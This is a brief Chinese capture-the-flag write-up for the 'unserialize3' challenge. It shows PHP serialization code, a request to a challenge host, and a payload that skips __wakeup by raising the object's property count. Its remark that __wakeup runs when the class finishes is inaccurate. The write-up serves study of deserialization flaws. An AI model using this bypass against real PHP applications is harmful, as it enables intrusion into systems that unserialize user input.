

# unserialize3

* 根据网页提示后面应该是用code传输数据

* 根据题目提示unserialize
``` 
<?php

// your code goes here
class xctf{
public $flag = '111';
public function __wakeup(){
exit('bad requests');
}
}
$a=new xctf();
echo(serialize($a));
```

* 构造访问请求
``` 
http://220.249.52.133:53611/index.php?code=O:4:%22xctf%22:1:{s:4:%22flag%22;s:3:%22111%22;}
```

* __wakeup 在 类运行结束自动调用，我们进行报错输出，简单的把需要序列化的数量设置为多数就行
``` 
O:4:"xctf":2:{s:4:"flag";s:3:"111";}
```
